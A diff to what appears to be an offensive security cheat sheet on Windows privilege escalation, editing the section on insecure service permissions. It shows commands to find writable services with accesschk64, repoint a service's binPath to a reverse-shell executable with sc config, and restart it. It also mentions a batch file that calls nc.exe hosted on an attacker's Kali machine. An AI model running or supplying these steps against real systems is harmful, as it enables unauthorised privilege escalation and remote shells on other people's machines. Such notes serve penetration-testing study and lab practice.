@@ -718,7 +718,7 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 - Insecure service permission (binpath)
 
-Similar to a previous one, check with `accesschk64.exe -uwcv Everyone *` if you have RW permission on some service. If so, you can reconfigure service and supply malicious executable as parameter :
+Similar to a previous one, check with `accesschk64.exe -uwcv Everyone *` if you have RW permission on some service. You can query a specific one to get more details with `accesschk64.exe -uwcv $SERVICE`. You can then reconfigure service and supply malicious executable as parameter :
 ```
 sc config $SERVICE binPath= "c:\path\rev.exe"
 net stop $SERVICE
@@ -729,7 +729,7 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 - Alternative to executables  
 
-Instead of reverse shell executables, you can make batch file which calls nc.exe hosted on kali with smbserver (more details below).  
+Instead of malicious executables crafted with msfvenom, you can make custom batch file which calls nc.exe hosted on kali with smbserver (more details below).  
 
 ## Get shells
 
